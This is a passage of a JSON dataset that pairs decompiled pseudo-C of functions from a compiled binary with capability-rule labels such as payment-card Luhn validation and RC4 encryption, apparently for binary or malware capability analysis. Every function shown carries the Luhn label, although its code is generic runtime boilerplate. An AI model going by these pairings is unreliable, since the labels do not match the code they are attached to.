        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00419e54(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack296 = 0x419f0a;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack300;\n    if (param_2 == 0) {\n        fcn.004055c8();\n    }\n    else {\n        puStack292 = &stack0xfffffffc;\n        fcn.00404530();\n        fcn.00405794();\n    }\n    var_114h = var_4h;\n    var_110h._0_1_ = 0xb;\n    fcn.00404530();\n    var_10ch = &var_104h;\n    var_108h._0_1_ = 4;\n    uVar1 = 1;\n    fcn.0040dbf4(1, &var_114h);\n    fcn.00404ec4();\n    *in_FS_OFFSET = uVar1;\n    uStack300 = 0x419f11;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 347
    },
    "0041a19c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a19c(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41a243;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x41a1c6;\n    fcn.0041a30c();\n    uStack48 = 0x41a226;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    iVar1 = (**(*param_2 + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*param_2 + 0xc))();\n            (**(*param_2 + 0x18))(0);\n            (**(*in_EAX + 0x3c))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x41a22d;\n    uStack48 = 0x41a225;\n    fcn.0041a3c8();\n    return;\n}\n",
        "token_count": 365
    },
    "0041a254": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a254(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x41a26c;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x41a27c;\n        fcn.0041a30c();\n        uStack24 = 0x41a2f4;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        (**(*in_EAX + 0x44))();\n        *(in_EAX + 1) = *(param_2 + 4);\n        *(in_EAX + 0xd) = *(param_2 + 0xd);\n        *(in_EAX + 3) = *(param_2 + 0xc);\n        *(in_EAX + 5) = *(param_2 + 5);\n        fcn.00405584();\n        *(in_EAX + 0xe) = *(param_2 + 0xe);\n        (**(*in_EAX + 0x40))();\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x41a305;\n        uStack24 = 0x41a2f3;\n        fcn.0041a3c8();\n        return;\n    }\n    puStack20 = 0x41a305;\n    fcn.00419e40();\n    return;\n}\n",
        "token_count": 386
    },
    "0041a37c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a37c(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = fcn.0041aedc;\n    fcn.0041a324(&stack0xfffffffc);\n    (**(*param_2 + 4))(pcVar1);\n    return;\n}\n",
        "token_count": 93
    },
    "0041a3dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a3dc(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41a471;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    iVar1 = (**(*in_EAX + 0x14))();\n    iVar2 = (**(*param_2 + 0x14))();\n    if ((iVar1 == iVar2) && (-1 < iVar1 + -1)) {\n        uVar3 = true;\n        do {\n            (**(*in_EAX + 0xc))();\n            (**(*param_2 + 0xc))(0);\n            fcn.00405974();\n            if (!uVar3) break;\n            iVar1 = iVar1 + -1;\n            uVar3 = iVar1 == 0;\n        } while (!uVar3);\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x41a478;\n    uStack44 = 0x41a470;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 337
    },
    "0041a488": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a488(uint param_1, uint param_2)\n\n{\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar auStack16 [4];\n    uchar uStack12;\n    \n    fcn.0041a484();\n    uStack12 = 0;\n    uStack52 = 0;\n    iStack48 = fcn.0040db38(0, auStack16);\n    if (iStack48 == 0) {\n        iStack48 = fcn.00405470();\n    }\n    uStack44 = param_2;\n    // WARNING: Could not recover jumptable at 0x00404ee5. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x495014)(0xeedfade, 1, 7, &uStack52);\n    return;\n}\n",
        "token_count": 196
    },
    "0041a518": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041a518(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x41a5f3;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x41a546;\n    fcn.0041a30c();\n    uStack52 = 0x41a5ce;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    (**(*in_EAX + 0xc))();\n    (**(*in_EAX + 0x18))();\n    (**(*in_EAX + 0xc))();\n    (**(*in_EAX + 0x20))();\n    (**(*in_EAX + 0x18))();\n    (**(*in_EAX + 0x24))();\n    (**(*in_EAX + 0x20))();\n    (**(*in_EAX + 0x24))();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x41a5d5;\n    uStack52 = 0x41a5cd;\n    fcn.0041a3c8();\n    return;\n}\n",
        "token_count": 364
    },
    "0041a79c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041a79c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41a814;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar2 = (**(*in_EAX + 0x34))();\n            if (iVar2 == 0) break;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41a81b;\n    uStack36 = 0x41a813;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 267
    },
    "0041a828": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a828(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_18h = 0;\n    var_14h = 0;\n    var_4h = 0;\n    uStack44 = 0x41a8eb;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    var_8h = param_2;\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        var_ch = 0;\n        var_10h = iVar1;\n        do {\n            (**(*in_EAX + 0xc))();\n            fcn.0041b004();\n            fcn.00405718();\n            iVar1 = fcn.0040e8cc();\n            if (iVar1 != 0) {\n                fcn.00405a44(&fcn.0041a828::var_18h);\n                iVar1 = (**(*in_EAX + 0x34))();\n                if (iVar1 == 0) goto code_r0x0041a8c8;\n            }\n            var_ch = var_ch + 1;\n            var_10h = var_10h + -1;\n        } while (var_10h != 0);\n    }\n    var_ch = -1;\ncode_r0x0041a8c8:\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x41a8f2;\n    uStack44 = 0x41a8e2;\n    fcn.00405554();\n    uStack44 = 0x41a8ea;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 479
    },
    "0041a9b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a9b4(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x41aa51;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x41a9dc;\n    fcn.0041a30c();\n    uStack40 = 0x41aa34;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    (***param_2)();\n    fcn.0041b714();\n    fcn.00405620();\n    (**(*param_2 + 0xc))();\n    (**(*in_EAX + 0x2c))();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x41aa3b;\n    uStack40 = 0x41aa33;\n    fcn.0041a3c8();\n    return;\n}\n",
        "token_count": 311
    },
    "0041aa60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041aa60(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x41ab01;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (param_1 != param_2) {\n        puStack40 = 0x41aa8f;\n        fcn.0041a30c();\n        uStack44 = 0x41aae4;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        puStack40 = &stack0xfffffffc;\n        (**(*in_EAX + 0xc))();\n        uVar1 = (**(*in_EAX + 0x18))();\n        (**(*in_EAX + 0x48))();\n        (**(*in_EAX + 100))();\n        *in_FS_OFFSET = uVar1;\n        uStack44 = 0x41aaeb;\n        uStack48 = 0x41aae3;\n        fcn.0041a3c8();\n        return;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41ab08;\n    uStack32 = 0x41ab00;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 378
    },
    "0041ab44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041ab44(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_ch = 0;\n    uStack24 = 0x41abe8;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x41ab6b;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.0041dcf0();\n    puStack32 = 0x41ab73;\n    fcn.0041a30c();\n    uStack36 = 0x41abc3;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    (**(*var_4h + 0x44))();\n    while( true ) {\n        cVar1 = fcn.0041cc3c();\n        if (cVar1 != '\\0') break;\n        fcn.0041ea20();\n        (**(*var_4h + 0x38))();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41abca;\n    uStack36 = 0x41abc2;\n    fcn.0041a3c8();\n    return;\n}\n",
        "token_count": 389
    },
    "0041aedc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041aedc(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41af52;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    fcn.0041f5f8();\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            fcn.0041f6b4();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    fcn.0041f600();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41af59;\n    uStack36 = 0x41af51;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 262
    },
    "0041b354": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041b354(void)\n\n{\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + 0x28))();\n    return;\n}\n",
        "token_count": 39
    },
    "0041b428": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b428(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    int32_t in_EDX;\n    \n    (**(*in_EAX + 0x84))();\n    if (in_EAX[7] == in_EAX[8]) {\n        fcn.0041b354();\n    }\n    if (in_EDX < in_EAX[7]) {\n        fcn.004030fc();\n    }\n    puVar1 = in_EAX[6] + in_EDX * 8;\n    *puVar1 = 0;\n    puVar1[1] = arg_8h;\n    fcn.00405584();\n    in_EAX[7] = in_EAX[7] + 1;\n    (**(*in_EAX + 0x80))();\n    return;\n}\n",
        "token_count": 192
    },
    "0041b714": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041b714(void)\n\n{\n    ulong uVar1;\n    int32_t *in_EAX;\n    \n    uVar1 = (**(*in_EAX + 0x18))(0, 0);\n    return uVar1;\n}\n",
        "token_count": 56
    },
    "0041b800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041b800(uint arg_8h)\n\n{\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    fcn.00404530();\n    var_8h = &var_108h;\n    var_4h._0_1_ = 4;\n    fcn.0040dbf4(0, &var_8h);\n    fcn.00404ec4();\n    return;\n}\n",
        "token_count": 116
    },
    "0041baa4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041baa4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStackY32;\n    uint uStackY28;\n    uchar *puStackY24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStackY24 = 0x41bac0;\n    fcn.0041c388(0x1000);\n    uStackY28 = 0x41baf4;\n    uStackY32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStackY24 = &stack0xfffffffc;\n    fcn.0041e5d0();\n    *in_FS_OFFSET = uStackY32;\n    puStackY24 = 0x41bafb;\n    uStackY28 = 0x41baf3;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 195
    },
    "0041bb04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041bb04(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 4) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 163
    },
    "0041bbc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041bbc8(uint32_t arg_8h)\n\n{\n    uint in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_DL = extraout_DL;\n    }\n    uVar1 = 0;\n    fcn.0041bc0c(0, arg_8h & 0xffff);\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 149
    },
    "0041c07c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041c07c(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    fcn.00405584();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 137
    },
    "0041c1dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041c1dc(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint noname_0;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_DL = extraout_DL;\n    }\n    fcn.00404620();\n    noname_0 = 0;\n    fcn.004059dc();\n    fcn.0041c2d4(noname_0, arg_8h);\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = noname_0;\n    }\n    return in_EAX;\n}\n",
        "token_count": 170
    },
    "0041c388": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041c388(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    uVar1 = fcn.00402f00();\n    *(in_EAX + 8) = uVar1;\n    *(in_EAX + 0xc) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 208
    },
    "0041c4d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041c4d4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 8) = arg_14h;\n    *(in_EAX + 0xc) = arg_10h;\n    fcn.00405584();\n    fcn.00405584();\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 224
    },
    "0041ca74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041ca74(void)\n\n{\n    uchar auStack12 [4];\n    uchar uStack8;\n    \n    uStack8 = 0xb;\n    fcn.0040dbf4(0, auStack12);\n    fcn.00404ec4();\n    return;\n}\n",
        "token_count": 65
    },
    "0041cf84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0041cf84(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    int32_t iStack20;\n    \n    iVar2 = fcn.00404528();\n    do {\n        if (iVar2 == *0x417520) {\n            if (*(in_EAX + 0x84) == 0) {\n                uVar4 = fcn.00418fa4();\n            }\n            else {\n                uVar4 = fcn.00418ea4();\n            }\n            return uVar4;\n        }\n        piVar3 = fcn.00418f2c();\n        if ((piVar3 != NULL) && (iVar2 = *piVar3,  -1 < iVar2 + -1)) {\n            iStack20 = 0;\n            do {\n                uVar4 = **(piVar3 + iStack20 * 2 + 1);\n                cVar1 = fcn.00404544();\n                if (cVar1 != '\\0') {\n                    return uVar4;\n                }\n                iStack20 = iStack20 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        iVar2 = fcn.004045dc();\n    } while( true );\n}\n",
        "token_count": 301
    },
    "0041d1b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d1b0(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x41d1c3;\n    (**(*param_2 + 0x20))();\n    uStack24 = 0x41d250;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    cVar1 = fcn.0041cc3c();\n    if (cVar1 == '\\0') {\n        fcn.0041a0bc();\n    }\n    while( true ) {\n        cVar1 = fcn.0041cc3c();\n        if (cVar1 != '\\0') break;\n        cVar1 = fcn.0041d034();\n        if (cVar1 - 2U < 3) {\n            fcn.0041dc40();\n        }\n        fcn.0041a09c();\n        fcn.0041dcf0();\n        while( true ) {\n            cVar1 = fcn.0041cc3c();\n            if (cVar1 != '\\0') break;\n            fcn.0041de5c();\n        }\n        fcn.0041dcf8();\n    }\n    fcn.0041dcf8();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41d257;\n    uStack24 = 0x41d24f;\n    (**(*param_2 + 0x24))();\n    return;\n}\n",
        "token_count": 386
    },
    "0041d920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041d920(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    while( true ) {\n        puStack32 = 0x41d942;\n        cVar3 = fcn.0041cc3c();\n        if (cVar3 != '\\0') break;\n        puStack32 = 0x41d93a;\n        fcn.0041de5c();\n    }\n    puStack32 = 0x41d94e;\n    fcn.0041dcf8();\n    uVar1 = *(in_EAX + 0x2c);\n    uVar2 = *(in_EAX + 0x28);\n    puStack32 = 0x41d96b;\n    uVar4 = fcn.0040484c();\n    *(in_EAX + 0x2c) = uVar4;\n    uStack36 = 0x41d9e2;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar5 = fcn.0040484c();\n    *(in_EAX + 0x28) = iVar5;\n    if (iVar5 == 0) {\n        *(in_EAX + 0x28) = *(in_EAX + 0x18);\n    }\n    while( true ) {\n        cVar3 = fcn.0041cc3c();\n        if (cVar3 != '\\0') break;\n        fcn.0041d670();\n    }\n    fcn.0041dcf8();\n    *in_FS_OFFSET = uStack40;\n    *(in_EAX + 0x2c) = uVar1;\n    *(in_EAX + 0x28) = uVar2;\n    return;\n}\n",
        "token_count": 472
    },
    "0041da28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0041da28(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    double dStack20;\n    \n    cVar2 = fcn.0041ebc0();\n    if (cVar2 == '\\x15') {\n        fcn.0041d058();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041dcac();\n        dStack20 = iVar1;\n    }\n    return dStack20;\n}\n",
        "token_count": 136
    },
    "0041da6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0041da6c(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    float fStack16;\n    \n    cVar2 = fcn.0041ebc0();\n    if (cVar2 == '\\x0f') {\n        fcn.0041d058();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041dcac();\n        fStack16 = iVar1;\n    }\n    return fStack16;\n}\n",
        "token_count": 138
    },
    "0041dab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0041dab0(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int64_t iStack20;\n    \n    cVar2 = fcn.0041ebc0();\n    if (cVar2 == '\\x10') {\n        fcn.0041d058();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041dcac();\n        iStack20 = ROUND(iVar1 * *0x41dafc);\n    }\n    return iStack20;\n}\n",
        "token_count": 148
    },
    "0041db00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
